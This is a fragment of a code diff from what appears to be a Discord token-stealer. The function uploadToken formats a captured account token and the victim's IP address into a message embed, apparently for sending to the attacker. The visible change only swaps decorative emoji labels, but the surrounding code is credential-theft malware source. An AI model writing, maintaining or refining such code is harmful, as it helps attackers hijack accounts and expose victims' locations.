@@ -302,7 +302,7 @@ def uploadToken(token, path):
             "color": 2895667,
             "fields": [
                 {
-                    "name": "<a:flyingcashmoney:939859721719005245> Token:",
+                    "name": "<a:8639dollar2:1014188341064900729> Token:",
                     "value": f"`{token}`"
                 },
                 {
@@ -316,7 +316,7 @@ def uploadToken(token, path):
                     "inline": True
                 },
                 {
-                    "name": "<a:6601blackworld:957353655307235368> IP:",
+                    "name": "<:VC_blackheart2:918226594550648903> IP:",
                     "value": f"`{getip()}`",
                     "inline": True
                 },
